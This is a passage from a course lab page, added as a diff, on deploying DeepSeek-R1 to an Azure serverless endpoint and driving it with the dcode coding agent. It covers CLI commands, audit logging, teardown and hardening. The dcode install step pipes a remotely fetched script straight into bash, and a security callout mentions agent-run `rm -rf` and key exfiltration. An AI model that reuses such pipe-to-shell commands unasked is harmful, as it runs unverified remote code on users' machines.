+  <summary class="label">Gotcha we hit testing this lab · "Enabled" locally ≠ usable</summary>
+  <p><code>az account list</code> reads a <em>cached</em> list and can report a subscription as <code>Enabled</code> even after it has been disabled — and a subscription is disabled if its payment method fails or a spending limit is hit (a prepaid card drained to $0 stops it cold). Your first resource command then fails with <code>SubscriptionNotFound</code>. Verify the subscription is actually live at the control plane <em>before</em> you rely on it:</p>
+<pre><code class="language-bash"># authoritative check — does Azure Resource Manager (ARM) actually return this subscription?
+az account subscription list --query "[].{name:displayName, state:state}" -o table
+# simplest smoke test — can you list resource groups in it?
+az group list -o table</code></pre>
+  <p>If the subscription shows <code>Enabled</code> in <code>az account list</code> but is <em>missing</em> from <code>az account subscription list</code> (or <code>az group list</code> errors with <code>SubscriptionNotFound</code>), it's disabled — top up the prepaid card / fix the payment method, or switch to another with <code>az account set</code>. And check the <em>name</em> in <code>az account show</code> every time: it is easy to be dropped onto a shared <strong>production</strong> subscription by default and deploy lab resources into it by accident.</p>
+  <p>The cache is stale in <em>both</em> directions: a subscription you just created (or that was just shared with you) can be <em>missing</em> from <code>az account list</code> even though it's live. Force a refresh instead of re-logging in:</p>
+<pre><code class="language-bash">az account list --refresh -o table    # re-pulls the list using your current token
+</code></pre>
+</details>
+
+<p><strong>Create the pay-as-you-go subscription.</strong> If you don't have one yet, add it from <em>Subscriptions → + Add</em>: the wizard's <strong>Basics</strong> tab picks your billing account and the <strong>Microsoft Azure Plan</strong>, you attach your <strong>prepaid debit card</strong> as the payment method, and its <strong>Budget</strong> tab sets a spend alert in the same flow. Pay-as-you-go is what enables serverless deployments and lifts the low default rate limits.</p>
+
+<div class="viz">
+  <div class="viz-title">Portal reference · Subscriptions → + Add → Create a subscription (Basics)</div>
+  <div class="viz-description">The billing-account, billing-profile, and invoice-section identifiers are sensitive — blur them if you screenshot this. The <strong>Plan</strong> must read <strong>Microsoft Azure Plan</strong>.</div>
+  <svg viewBox="0 0 720 296" style="display:block;width:100%;max-width:720px;height:auto;margin:4px auto;background:#fff;border:1px solid var(--rule);border-radius:6px;font-family:system-ui,-apple-system,'Segoe UI',sans-serif" aria-label="Create a subscription Basics tab, illustrative, billing IDs redacted">
+    <rect x="0" y="0" width="720" height="28" fill="#0078d4"/>
+    <text x="14" y="18" fill="#fff" font-size="12" font-weight="700">Microsoft Azure</text>
+    <text x="14" y="52" fill="#1f1d1a" font-size="18" font-weight="700">Create a subscription</text>
+    <text x="14" y="80" fill="#0067b8" font-size="12" font-weight="700">Basics</text>
+    <line x1="12" y1="86" x2="56" y2="86" stroke="#0067b8" stroke-width="2"/>
+    <text x="70" y="80" fill="#666" font-size="12">Advanced</text>
+    <text x="150" y="80" fill="#666" font-size="12">Budget</text>
+    <text x="212" y="80" fill="#666" font-size="12">Tags</text>
+    <text x="256" y="80" fill="#666" font-size="12">Review + create</text>
+    <line x1="12" y1="92" x2="706" y2="92" stroke="#e0ddd3"/>
+    <text x="14" y="114" fill="#1f1d1a" font-size="12" font-weight="700">Subscription details</text>
+    <text x="14" y="144" fill="#333" font-size="11.5">Subscription name *</text>
+    <rect x="300" y="128" width="406" height="24" fill="#fff" stroke="#8a8577"/>
+    <text x="310" y="144" fill="#1f1d1a" font-size="11">ds-payg</text>
+    <text x="14" y="178" fill="#333" font-size="11.5">Billing account *</text>
+    <rect x="300" y="162" width="406" height="24" fill="#fff" stroke="#8a8577"/>
+    <text x="310" y="178" fill="#1f1d1a" font-size="11">Your name (••••••••-••••-••••-••••)</text>
+    <text x="694" y="178" fill="#555" font-size="11" text-anchor="end">▾</text>
+    <text x="40" y="212" fill="#333" font-size="11.5">Billing profile *</text>
+    <rect x="300" y="196" width="406" height="24" fill="#fff" stroke="#8a44a0"/>
+    <text x="310" y="212" fill="#1f1d1a" font-size="11">Your name (••••-••••-•••-•••)</text>
+    <text x="694" y="212" fill="#555" font-size="11" text-anchor="end">▾</text>
+    <text x="66" y="246" fill="#333" font-size="11.5">Invoice section *</text>
+    <rect x="300" y="230" width="406" height="24" fill="#fff" stroke="#8a8577"/>
+    <text x="310" y="246" fill="#1f1d1a" font-size="11">Your name (••••-••••-•••-•••)</text>
+    <text x="694" y="246" fill="#555" font-size="11" text-anchor="end">▾</text>
+    <text x="14" y="280" fill="#333" font-size="11.5">Plan *</text>
+    <rect x="300" y="264" width="406" height="24" fill="#fff" stroke="#8a8577"/>
+    <text x="310" y="280" fill="#1f1d1a" font-size="11">Microsoft Azure Plan</text>
+    <text x="694" y="280" fill="#555" font-size="11" text-anchor="end">▾</text>
+  </svg>
+</div>
+
+<div class="viz">
+  <div class="viz-title">Portal reference · Create a subscription (Budget tab)</div>
+  <div class="viz-description">Set the budget in the same wizard. A budget <em>alerts</em> at your threshold; it does <strong>not</strong> hard-stop spending — so pair it with a prepaid card whose balance is the real ceiling.</div>
+  <svg viewBox="0 0 720 250" style="display:block;width:100%;max-width:720px;height:auto;margin:4px auto;background:#fff;border:1px solid var(--rule);border-radius:6px;font-family:system-ui,-apple-system,'Segoe UI',sans-serif" aria-label="Create a subscription Budget tab, illustrative">
+    <rect x="0" y="0" width="720" height="28" fill="#0078d4"/>
+    <text x="14" y="18" fill="#fff" font-size="12" font-weight="700">Microsoft Azure</text>
+    <text x="14" y="52" fill="#1f1d1a" font-size="18" font-weight="700">Create a subscription</text>
+    <text x="14" y="80" fill="#666" font-size="12">Basics</text>
+    <text x="60" y="80" fill="#666" font-size="12">Advanced</text>
+    <text x="140" y="80" fill="#0067b8" font-size="12" font-weight="700">Budget</text>
+    <line x1="138" y1="86" x2="184" y2="86" stroke="#0067b8" stroke-width="2"/>
+    <text x="200" y="80" fill="#666" font-size="12">Tags</text>
+    <text x="244" y="80" fill="#666" font-size="12">Review + create</text>
+    <line x1="12" y1="92" x2="706" y2="92" stroke="#e0ddd3"/>
+    <text x="14" y="114" fill="#1f1d1a" font-size="12" font-weight="700">Budget details</text>
+    <text x="14" y="132" fill="#555" font-size="11">Create a budget for this subscription.</text>
+    <text x="14" y="164" fill="#333" font-size="11.5">Name</text>
+    <rect x="300" y="148" width="406" height="24" fill="#fff" stroke="#8a8577"/>
+    <text x="310" y="164" fill="#1f1d1a" font-size="11">ds-course</text>
+    <text x="14" y="198" fill="#333" font-size="11.5">Amount (in USD)</text>
+    <rect x="300" y="182" width="406" height="24" fill="#fff" stroke="#8a8577"/>
+    <text x="310" y="198" fill="#1f1d1a" font-size="11">25</text>
+    <text x="14" y="232" fill="#333" font-size="11.5">Alert condition</text>
+    <text x="300" y="232" fill="#1f1d1a" font-size="11">Send alert when</text>
+    <rect x="404" y="220" width="46" height="24" fill="#fff" stroke="#8a8577"/>
+    <text x="414" y="236" fill="#1f1d1a" font-size="11">100</text>
+    <text x="458" y="232" fill="#1f1d1a" font-size="11">% of the amount has been crossed (emailed to you)</text>
+  </svg>
+</div>
+
+<div class="callout note">
+  <span class="label">Why pay-as-you-go + a prepaid card · the budget alerts, the card is the real ceiling</span>
+  <p>A brand-new or spending-limited subscription gets low serverless rate limits and can't create pay-as-you-go serverless deployments — which is why the §5.4 smoke test may keep returning <code>429</code>. Being on <strong>pay-as-you-go</strong> (which you set up in §5.1) is what relaxes the limit and lets <code>az ml serverless-endpoint create</code> work. Two controls keep the spend safe, and they do different jobs:</p>
+  <ol>
+    <li><strong>The budget alerts.</strong> Portal → <a href="https://portal.azure.com/#view/Microsoft_Azure_CostManagement/Menu/~/budgets">Cost Management → Budgets → + Add</a>; scope it to your subscription, set an amount (e.g. $20) and email alerts at 50 / 80 / 100 %. A budget <em>alerts</em> — it does not hard-stop spending — so treat it as an early warning, not a cap.</li>
+    <li><strong>The prepaid card is the hard ceiling.</strong> A <strong>prepaid debit card is the safe choice for a lab</strong>: its loaded balance <em>is</em> a hard ceiling — Azure can never charge more than what's on the card. That's the real cap the budget can't give you.</li>
+  </ol>
+  <p><strong>Tear the endpoint and resource group down when you're done (§5.7)</strong> so nothing keeps drawing on the card, and keep an eye on the budget alerts — a reasoning model driven by an agent can spend faster than you expect.</p>
+</div>
+
+<p>That <code>user.name</code> is your <span class="gloss" data-gloss="entra-id">Entra ID</span> — the same identity that will authorize the deployment, own the endpoint's keys, and appear in every audit-log line. This is <em>workload/user identity, not a static key</em>: principle #3 and #6 of the NSA list, satisfied before you deploy anything.</p>
+
+<h3>5.2 Stand up the Foundry project</h3>
+<p>A Foundry project is an Azure ML workspace with a model catalog attached. Create the <span class="gloss" data-gloss="resource-group">resource group</span>, register the resource providers a brand-new subscription needs, create the workspace, then set CLI defaults so later commands don't repeat them.</p>
+<div class="codetabs">
+  <div class="codetab-bar">
+    <button type="button" class="codetab-btn active" data-os="mac">macOS / Linux</button>
+    <button type="button" class="codetab-btn" data-os="win">Windows (PowerShell)</button>
+  </div>
+  <div class="codetab-panel" data-os="mac"><pre><code class="language-bash">az extension add -n ml                # once; 'az extension update -n ml' to refresh
+az group create -n ds6042-lab13 -l eastus2
+
+# On a NEW subscription these providers start unregistered. Register them first, or
+# 'az ml workspace create' fails with MissingSubscriptionRegistration.
+for ns in Microsoft.MachineLearningServices Microsoft.Storage Microsoft.KeyVault \
+          Microsoft.ContainerRegistry Microsoft.Insights Microsoft.CognitiveServices; do
+  az provider register --namespace $ns
+done
+# registration is async (1-3 min); wait until this prints 'Registered':
+az provider show -n Microsoft.MachineLearningServices --query registrationState -o tsv
+
+az ml workspace create -n ds6042-foundry -g ds6042-lab13 -l eastus2   # ~3-5 min
+
+# make these the defaults for every 'az ml' command below
+az configure --defaults group=ds6042-lab13 workspace=ds6042-foundry location=eastus2</code></pre></div>
+  <div class="codetab-panel" data-os="win" hidden><pre><code class="language-powershell">az extension add -n ml                # once; 'az extension update -n ml' to refresh
+az group create -n ds6042-lab13 -l eastus2
+
+# On a NEW subscription these providers start unregistered. Register them first, or
+# 'az ml workspace create' fails with MissingSubscriptionRegistration.
+$providers = "Microsoft.MachineLearningServices","Microsoft.Storage","Microsoft.KeyVault",
+             "Microsoft.ContainerRegistry","Microsoft.Insights","Microsoft.CognitiveServices"
+foreach ($ns in $providers) { az provider register --namespace $ns }
+
+# registration is async (1-3 min); wait until this prints 'Registered':
+az provider show -n Microsoft.MachineLearningServices --query registrationState -o tsv
+
+az ml workspace create -n ds6042-foundry -g ds6042-lab13 -l eastus2   # ~3-5 min
+
+# make these the defaults for every 'az ml' command below
+az configure --defaults group=ds6042-lab13 workspace=ds6042-foundry location=eastus2</code></pre></div>
+</div>
+
+<div class="callout note">
+  <span class="label">Predictable snags in §5.2 (we hit all three while testing)</span>
+  <ul>
+    <li><strong><code>MissingSubscriptionRegistration</code></strong> on a fresh subscription — the providers above aren't registered by default. Register them once per subscription and wait for <code>Registered</code> before creating the workspace.</li>
+    <li><strong>The workspace create takes ~3-5 minutes</strong> and provisions four dependencies you'll see appear in the resource group: a storage account, a Key Vault, Application Insights, and (later, on demand) a container registry. That's expected, not a bug.</li>
+    <li><strong>Region matters — twice.</strong> First, not every region offers serverless DeepSeek-R1; <code>eastus2</code> is a safe default, and if §5.3 says the model isn't available, recreate the workspace in a <a href="https://learn.microsoft.com/azure/ai-foundry/how-to/deploy-models-serverless-availability">supported region</a>. Second, your subscription or organization may <strong>restrict regions</strong> via an "allowed locations" Azure Policy — so <code>az group create -l eastus2</code> can fail with <code>RequestDisallowedByPolicy</code> if eastus2 isn't allowed. See (and confirm) which regions you're allowed in <strong>Policy → <a href="https://portal.azure.com/#view/Microsoft_Azure_Policy/PolicyMenuBlade/~/Assignments">Assignments</a></strong>, then pick a region that is <em>both</em> policy-allowed and offers the model.</li>
+  </ul>
+</div>
+
+<h3>5.3 Deploy DeepSeek-R1 from the model catalog</h3>
+<p>DeepSeek-R1 is an open-weights (MIT-licensed) frontier <em>reasoning</em> model that's strong at code, and Azure hosts it as a <strong>"sold by Azure"</strong> serverless offering — the cleanest possible deploy: <em>no Marketplace subscription</em>, just an endpoint. We deployed exactly this end-to-end while writing the lab (create → smoke test → teardown), so the commands below are the ones that actually worked. Confirm the Model ID first:</p>
+<pre><code class="language-bash">az ml model show --name DeepSeek-R1 --registry-name azureml-deepseek --query id -o tsv
+# → azureml://registries/azureml-deepseek/models/DeepSeek-R1/versions/N</code></pre>
+<p>Drop the trailing <code>/versions/N</code> (serverless always deploys the latest) and put the Model ID in an endpoint spec:</p>
+<pre class="filename">endpoint.yml</pre>
+<pre><code class="language-yaml">name: deepseek-r1-lab13
+model_id: azureml://registries/azureml-deepseek/models/DeepSeek-R1</code></pre>
+
+<pre><code class="language-bash"># DeepSeek is "sold by Azure" → deploy straight to a serverless endpoint, no subscription step.
+az ml serverless-endpoint create -f endpoint.yml            # ~2-5 min
+az ml serverless-endpoint show -n deepseek-r1-lab13 --query provisioning_state -o tsv   # → Succeeded
+
+# the endpoint URL (the "Target URI") lives on the endpoint object:
+az ml serverless-endpoint show -n deepseek-r1-lab13 --query scoring_uri -o tsv
+# → https://deepseek-r1-lab13.&lt;region&gt;.models.ai.azure.com
+
+# the API keys come from a SEPARATE call (two keys, so you can rotate one at a time):
+az ml serverless-endpoint get-credentials -n deepseek-r1-lab13
+# → { "primaryKey": "abcd… (32 chars)", "secondaryKey": "efgh… (32 chars)" }</code></pre>
+
+<div class="callout note">
+  <span class="label">Gotcha we hit · resolving in the registry ≠ serverless-deployable</span>
+  <p><code>az ml model show</code> succeeding only proves the model <em>asset</em> exists. Whether it can be deployed <em>serverless</em> is a separate, per-model, per-region offer. While testing, a sibling model resolved fine yet <code>serverless-endpoint create</code> failed with <code>ServerlessModelNotAvailable</code> — it simply wasn't offered serverless in <code>eastus2</code>. DeepSeek-R1 <em>is</em> (that's why the lab uses it). If you see that error: pick a model whose catalog card lists <strong>Serverless API</strong> in your region, recreate the workspace in a <a href="https://learn.microsoft.com/azure/ai-foundry/how-to/deploy-models-serverless-availability">supported region</a>, or fall back to managed compute (next callout).</p>
+</div>
+
+<p>Between the two calls you now have the pair every later step needs: the <strong>Target URI</strong> (from <code>show</code> — the endpoint's HTTPS address, speaking the OpenAI-compatible <a href="https://learn.microsoft.com/azure/ai-foundry/model-inference/reference/reference-model-inference-api">Azure AI Model Inference API</a>) and a <strong>bearer key</strong> (from <code>get-credentials</code> — use <code>primaryKey</code>). Two things are already true and load-bearing: the endpoint is <strong>key-authenticated</strong> (no anonymous calls) and <strong>content filtering is on by default</strong> (Azure AI Content Safety screens prompts and responses). <strong>Treat that key like a password</strong> — on its own it lets anyone call your model, bill your subscription, and (until §6) bypass every other control. §5.4 captures both straight into environment variables so you never paste the key into a file.</p>
+
+<div class="callout note">
+  <span class="label">Partner/community models need one extra step (DeepSeek doesn't)</span>
+  <p>Models <em>sold by Azure</em> — DeepSeek, and Microsoft's own Phi — deploy straight to a serverless endpoint as above. Models <em>from partners &amp; community</em> (some Mistral, Cohere, and others) are Azure Marketplace offers: for those you first subscribe the project, then create the endpoint.</p>
+<pre><code class="language-bash"># only for a partner/Marketplace model — subscription.yml carries the same name + model_id
+az ml marketplace-subscription create -f subscription.yml
+az ml serverless-endpoint create -f endpoint.yml</code></pre>
+  <p>If <code>serverless-endpoint create</code> ever errors that a subscription is required, that's the model telling you it's a partner offer — create the Marketplace subscription first.</p>
+</div>
+
+<div class="callout note">
+  <span class="label">If serverless isn't offered in your region — use managed compute</span>
+  <p>Serverless availability is regional. If the catalog card for DeepSeek-R1 shows only <strong>Managed compute</strong> in your region (or serverless create fails as unavailable), deploy that way instead: on the card choose <em>Deploy → Managed compute</em>, pick the smallest GPU SKU (stock-keeping unit, i.e. the VM size/tier) it fits on, and deploy. Same OpenAI-compatible endpoint + key downstream; the difference is you pay for a running VM (scale to zero or delete when done) and you need GPU quota on the subscription. Every later step — smoke test, dcode, audit — is identical.</p>
+</div>
+
+<h3>5.4 Smoke-test the endpoint</h3>
+<p>Capture the URI and key <em>straight from the CLI</em> into environment variables — no copy-paste, no guessing the hostname, and the key never touches a file:</p>
+<pre><code class="language-bash"># the endpoint's base URL:
+export DEEPSEEK_ENDPOINT=$(az ml serverless-endpoint show -n deepseek-r1-lab13 --query scoring_uri -o tsv)
+# the bearer key (primaryKey field of get-credentials):
+export DEEPSEEK_KEY=$(az ml serverless-endpoint get-credentials -n deepseek-r1-lab13 --query primaryKey -o tsv)
+echo "endpoint: $DEEPSEEK_ENDPOINT"     # sanity check → https://…models.ai.azure.com</code></pre>
+<p>Then hit the OpenAI-compatible route. Any OpenAI client library works unchanged — that's the whole point of a compatible API.</p>
+<pre><code class="language-bash">curl "$DEEPSEEK_ENDPOINT/v1/chat/completions" \
+  -H "Authorization: Bearer $DEEPSEEK_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{"model":"DeepSeek-R1",
+       "messages":[{"role":"user","content":"Write a Python one-liner that reverses a string."}],
+       "max_tokens":2048}'</code></pre>
+<div class="callout note">
+  <span class="label">Endpoint-URL details students trip on</span>
+  <ul>
+    <li><strong>Don't guess the hostname.</strong> Paste the exact <em>Target URI</em> from <code>get-credentials</code> into <code>DEEPSEEK_ENDPOINT</code> — the region and the random suffix vary per deployment; the value above is only illustrative.</li>
+    <li><strong>Two route conventions.</strong> If <code>/v1/chat/completions</code> returns 404, the deployment is exposing the native Azure route instead — call <code>$DEEPSEEK_ENDPOINT/chat/completions?api-version=2024-05-01-preview</code> with the same bearer key. Both speak the same request/response shape; OpenAI client libraries default to the <code>/v1</code> form.</li>
+    <li><strong>401/403</strong> means the key didn't ride along — check the <code>Authorization: Bearer</code> header, not <code>api-key</code> (Azure OpenAI resources use <code>api-key</code>; serverless model endpoints use <code>Authorization: Bearer</code>).</li>
+    <li><strong>429 · <code>Rate Limit ... exceeded</code></strong> is capacity, not your code — the auth worked (or you'd get 401). Serverless "sold by Azure" models run on <em>shared</em> capacity with a per-minute request/token cap, so a just-created endpoint or a busy region can 429 even on the first call. It's retryable: wait ~30–60 s and run it again, or add backoff (the dcode/SDK client already retries). If it persists, request a quota increase, or deploy to <strong>managed compute</strong> for dedicated capacity with no shared rate limit.</li>
+  </ul>
+</div>
+<div class="callout note">
+  <span class="label">R1 is a reasoning model — budget tokens, expect a &lt;think&gt; trace</span>
+  <p>DeepSeek-R1 "thinks" before it answers: the response <code>content</code> contains a <code>&lt;think&gt;…&lt;/think&gt;</code> block and <em>then</em> the answer. In our smoke test a one-word reply used <strong>134 completion tokens</strong>. Two consequences: (1) set <code>max_tokens</code> generously (2048+) or the reply gets cut off <em>inside</em> the reasoning, before any answer appears; (2) reasoning tokens are billed, so R1 costs more per turn than a non-reasoning model — fine for a lab, worth knowing for an agent that loops. If you want cheaper, snappier agent turns and your region offers it, a non-reasoning DeepSeek/Qwen-Coder serverless model drops in with no other changes.</p>
+</div>
+
+<h3>5.5 Hook it to Deep Agents Code (<code>dcode</code>)</h3>
+<p><code>dcode</code> is LangChain's terminal coding agent: it plans, reads and edits files, runs shell commands, and spawns subagents — driven by whatever model you point it at. We point it at <em>your</em> DeepSeek-R1 endpoint. Because the endpoint is OpenAI-compatible, the agent treats it as an OpenAI model with a custom base URL and key.</p>
+
+<p>It's one of several terminal coding agents that all do roughly the same job — plan, edit files, run your shell. What separates them <em>for this lab</em> is one question: can you point the agent at the model <strong>you</strong> host? That comes down to the <strong>wire format</strong> the agent expects a custom endpoint to speak, because your §5.4 endpoint talks the OpenAI <em>Chat Completions</em> API.</p>
+
+<table>
+  <thead><tr><th>Agent</th><th>Maker · open source?</th><th>Models it drives</th><th>Wire format for a custom endpoint</th><th>Drops onto your §5.4 Azure endpoint as-is?</th></tr></thead>
+  <tbody>
+    <tr><td><strong><a href="https://docs.langchain.com/oss/python/deepagents/code/overview">dcode</a></strong> (Deep Agents Code)</td><td>LangChain · <strong>yes</strong> (MIT)</td><td>Any — <code>provider:model</code> or any LangChain chat model</td><td>OpenAI <strong>Chat Completions</strong> (<code>base_url</code> + key)</td><td><strong>Yes — directly.</strong> This is what the lab uses.</td></tr>
+    <tr><td><strong><a href="https://opencode.ai">opencode</a></strong></td><td>SST / Anomaly · <strong>yes</strong> (MIT)</td><td>75+ providers (OpenAI, Anthropic, Google, Bedrock, Azure, Ollama…)</td><td>OpenAI-compatible + per-provider plugins</td><td><strong>Yes</strong> — add its Azure / OpenAI-compatible provider</td></tr>
+    <tr><td><strong><a href="https://code.claude.com/docs/en/model-config">Claude Code</a></strong></td><td>Anthropic · <strong>no</strong> (CLI proprietary; Agent SDK is open)</td><td>Claude family (direct, or via Bedrock / Vertex / self-host)</td><td>Anthropic <strong>Messages API</strong> (<code>/v1/messages</code>)</td><td><strong>Not directly</strong> — needs a translating gateway (e.g. LiteLLM) or an endpoint that speaks <code>/v1/messages</code></td></tr>
+    <tr><td><strong><a href="https://github.com/openai/codex">Codex CLI</a></strong></td><td>OpenAI · <strong>yes</strong> (Apache-2.0)</td><td>OpenAI GPT-5.x Codex; custom providers via <code>config.toml</code></td><td>OpenAI <strong>Responses API</strong> (<code>wire_api = "responses"</code>)</td><td><strong>Not directly</strong> — a Chat-Completions endpoint needs a Responses-API gateway in front</td></tr>
+  </tbody>
+</table>
+
+<p><strong>Why the lab uses dcode:</strong> it and opencode speak OpenAI Chat Completions, so they attach to your Azure endpoint with just the base URL and key from §5.4. Claude Code expects the Anthropic Messages API and Codex expects the OpenAI Responses API, so pointing <em>those</em> at a Chat-Completions endpoint means running a translating gateway (like <a href="https://docs.litellm.ai/">LiteLLM</a>) in between. Same agent capabilities — different plumbing, and the plumbing is the lesson: "OpenAI-compatible" is not one thing, so always check <em>which</em> API surface a client expects before you assume your endpoint drops in.</p>
+
+<p><strong>The SDK path (fully explicit, recommended for the lab).</strong> Build the model object yourself so the base URL, key, and model name are unambiguous:</p>
+<pre><code class="language-python"># agent.py — DeepSeek-R1 on Azure, driving a coding deep agent
+import os
+from deepagents import create_deep_agent
+from langchain_openai import ChatOpenAI
+
+deepseek = ChatOpenAI(
+    base_url=os.environ["DEEPSEEK_ENDPOINT"] + "/v1",   # your Azure Target URI
+    api_key=os.environ["DEEPSEEK_KEY"],                 # the endpoint's primary key
+    model="DeepSeek-R1",
+    temperature=0,
+)
+
+# create_deep_agent ships filesystem tools (ls/read_file/write_file/edit_file/glob/grep),
+# a shell 'execute' tool, task-planning (write_todos), and subagents (task).
+agent = create_deep_agent(
+    model=deepseek,
+    system_prompt="You are a careful coding agent. Explain before you run shell commands.",
+)
+
+result = agent.invoke({"messages": [
+    {"role": "user", "content": "Create fizzbuzz.py and run it for n=1..15."}
+]})
+print(result["messages"][-1].content)</code></pre>
+
+<pre><code class="language-bash">pip install deepagents langchain-openai
+python agent.py</code></pre>
+
+<p><strong>The CLI path (the <code>dcode</code> binary).</strong> Same endpoint, driven interactively. Install it, expose the Azure endpoint through the OpenAI-compatible environment variables, and select the model with the <code>provider:model</code> syntax:</p>
+<pre><code class="language-bash">curl -LsSf https://langch.in/dcode | bash        # installs the dcode CLI
+
+export OPENAI_BASE_URL="$DEEPSEEK_ENDPOINT/v1"         # point 'openai' provider at Azure
+export OPENAI_API_KEY="$DEEPSEEK_KEY"
+
+dcode --model openai:DeepSeek-R1                      # interactive coding session
+dcode --model openai:DeepSeek-R1 -n "Add a --json flag to cli.py and update the README"</code></pre>
+
+<div class="callout note">
+  <span class="label">Confirming (and debugging) the dcode ↔ Azure link</span>
+  <ul>
+    <li><strong>Isolate failures with §5.4 first.</strong> If dcode errors, re-run the raw <code>curl</code> from §5.4. If curl works but dcode doesn't, it's a config problem (wrong <code>OPENAI_BASE_URL</code>, missing <code>/v1</code>, stale key), not the endpoint.</li>
+    <li><strong>Confirm traffic is really hitting Azure</strong> by watching it appear in the §5.6 audit log after a prompt — that round-trip is the proof the agent is driving <em>your</em> model, not a cached local one.</li>
+    <li><strong>Tool-calling must work — and reasoning models are streakier at it.</strong> dcode's file/shell tools need the model to emit tool calls. DeepSeek-R1 <em>is</em> a reasoning model, and reasoning models are less consistent tool-callers than a dedicated coder. If the agent chats but never actually edits a file or runs a command, that's the model, not dcode — swap in a non-reasoning serverless coder (Qwen-Coder, a DeepSeek V-series if your region offers it) with no other config change.</li>
+    <li><strong>Config lives in</strong> <code>~/.deepagents/config.toml</code> and <code>~/.deepagents/.env</code> — put the base URL and key there to avoid re-exporting them each session.</li>
+  </ul>
+</div>
+
+<div class="callout insight">
+  <span class="label">the agent is a client-side attack surface · watch the approval gate</span>
+  <p><code>dcode</code>'s <code>execute</code> tool runs real shell commands. Its safety model is <strong>human approval gates</strong> on destructive operations — the client-side twin of the cloud-side content filter. Auto-approving everything (a <code>--yolo</code>-style flag, or an over-broad allow rule) is how "the model hallucinated <code>rm -rf</code>" or "a prompt-injected file told the agent to exfiltrate your keys" becomes real. This is the Lab 5 / Lab 10 agent-security lesson landing inside a deployment lab: <strong>the endpoint key you just minted now lives on a machine where an agent runs commands.</strong> Keep the gate on; run untrusted tasks in a sandbox (dcode supports remote sandboxes — Modal, E2B, LangSmith).</p>
+</div>
+
+<h3>5.6 Audit logging · Azure Monitor</h3>
+<p>Diagnostic settings attach to the <strong>workspace</strong> (that's the resource that emits the model deploy/read/inferencing events — we confirmed the categories with <code>az monitor diagnostic-settings categories list</code>), and stream them to a Log Analytics workspace you can query with KQL. Answer "who called the model, when" the same day-one way §8 asks for.</p>
+<pre><code class="language-bash">az monitor log-analytics workspace create -g ds6042-lab13 -n ds6042-logs
+
+# (optional) see exactly which log categories the workspace offers:
+az monitor diagnostic-settings categories list \
+  --resource $(az ml workspace show -n ds6042-foundry --query id -o tsv) -o table
+
+# stream all workspace diagnostics (model + deployment + inferencing events) to Log Analytics
+az monitor diagnostic-settings create \
+  --name deepseek-audit \
+  --resource $(az ml workspace show -n ds6042-foundry --query id -o tsv) \
+  --workspace ds6042-logs \
+  --logs '[{"categoryGroup":"allLogs","enabled":true}]'</code></pre>
+<pre><code class="language-kusto">// KQL — recent Azure ML activity, newest first (field names vary by category;
+// run a bare 'AzureDiagnostics | take 50' first to see the columns your events carry)
+AzureDiagnostics
+| where ResourceProvider == "MICROSOFT.MACHINELEARNINGSERVICES"
+| where TimeGenerated > ago(24h)
+| project TimeGenerated, OperationName, Category, CallerIPAddress
+| order by TimeGenerated desc</code></pre>
+
+<p>Now the endpoint is authenticated, content-filtered, and audited; the agent driving it has an approval gate; and every request lands in a warehouse you can SQL. That is the NSA checklist, satisfied from the command line.</p>
+
+<h3>5.7 Tear it down (do this — it's how you stop the bill)</h3>
+<p>Cloud resources bill until you delete them. A serverless endpoint only bills per token, but the workspace's storage, Key Vault, and any managed-compute VM keep costing money while they exist. When you're done for the day, delete the endpoint (and its Marketplace subscription); when you're done with the lab, delete the whole resource group in one shot.</p>
+<pre><code class="language-bash"># stop token billing: delete the endpoint (DeepSeek is sold-by-Azure, no subscription to remove).
+# NOTE: 'serverless-endpoint delete' has NO --yes flag; it deletes without a prompt.
+az ml serverless-endpoint delete -n deepseek-r1-lab13 --no-wait
+# only if you deployed a PARTNER model and created a Marketplace subscription:
+# az ml marketplace-subscription delete -n &lt;sub-name&gt;
+
+# nuke everything from this lab at once (irreversible — deletes the whole group)
+az group delete -n ds6042-lab13 --yes --no-wait
+
+# confirm it's gone
+az group exists -n ds6042-lab13        # → false once the delete finishes</code></pre>
+<div class="callout note">
+  <span class="label">Two teardown gotchas</span>
+  <ul>
+    <li><strong>Soft-delete keeps Key Vault around.</strong> The Key Vault created by the workspace is <span class="gloss" data-gloss="soft-delete"><em>soft-deleted</em></span>, not gone — it lingers (and can block re-creating a same-named vault) for the retention window. Purge it if you need the name back: <code>az keyvault purge -n &lt;vault-name&gt;</code>.</li>
+    <li><strong>Managed compute is the expensive mistake.</strong> If you took the managed-compute path, the GPU VM bills per hour even idle. Deleting the resource group removes it, but double-check with <code>az ml online-endpoint list</code> / <code>az vm list -o table</code> that nothing GPU-shaped is still running.</li>
+  </ul>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="harden">6 · Hardening · the NSA checklist on this deployment</h2>
+
+<p>Going back to the seven principles in §3, here's how each maps to specific Azure configuration for the DeepSeek-R1 + dcode deployment — plus one row the NSA list predates: constraining the <em>agent</em> that now holds your endpoint key.</p>
+
+<table>
+  <thead><tr><th>NSA principle</th><th>What to enable on Azure</th></tr></thead>
+  <tbody>
+    <tr><td>1. Inherit a secure environment</td><td>Deploy the resource group + workspace with Bicep or Terraform, not click-ops. Apply an <a href="https://learn.microsoft.com/azure/cloud-adoption-framework/ready/landing-zone/">Azure landing zone</a> baseline and <strong>Azure Policy</strong> guardrails (deny public network, require customer-managed keys, CMK) at the subscription.</td></tr>
+    <tr><td>2. Protect at rest / in transit / in use</td><td><strong>Azure Key Vault</strong> customer-managed keys on the workspace + its storage. TLS 1.3 is default. For "in use," confidential computing (DCasv5 / NCC-H100) SKUs.</td></tr>
+    <tr><td>3. Secure exposed APIs</td><td>Prefer <span class="gloss" data-gloss="managed-identity">Entra managed identity</span> tokens over the static endpoint key where the caller is an Azure workload; keep <strong>Azure AI Content Safety</strong> on. Put <strong>Azure API Management</strong> or Front Door (a web application firewall, WAF, + rate limits) in front. Validate input before the call.</td></tr>
+    <tr><td>4. Monitor behaviour</td><td>Azure Monitor + Log Analytics (§5.6) + a scheduled KQL alert for query-volume anomalies. <a href="https://learn.microsoft.com/azure/defender-for-cloud/">Microsoft Defender for Cloud</a> for finding-level alerts.</td></tr>
+    <tr><td>5. Protect model weights</td><td>DeepSeek-R1 is open-weights: on managed compute, store the model artifacts in a CMK-encrypted storage account with RBAC + audit, and <strong>pin the model version</strong> your eval passed against.</td></tr>
